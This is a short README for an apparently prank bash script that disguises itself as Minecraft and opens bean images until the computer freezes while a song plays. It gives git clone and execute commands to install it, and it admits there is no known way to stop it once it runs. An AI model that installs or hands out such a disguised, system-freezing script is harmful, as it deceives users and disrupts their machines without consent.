# What is this?
This is a bash script that disguises itself as Minecraft and will open pictures of beans untill your pc freezes while it plays Josh Groban - Bean Song in the background

# How do I install this?
```shell
git clone https://github.com/hacktail/Beans-virus-thing.git
cd Beans-virus-thing
chmod +rwx ./INSTALLBEANS.sh
./INSTALLBEANS.sh
```
# How do I uninstall this?
```shell
cd Beans-virus-thing
chmod +rwx ./REMOVEBEANS.sh // Only if you haven't run the installer
./REMOVEBEANS.sh
```

# How do I stop this from executing?
I don't know ¯\_(ツ)_/¯
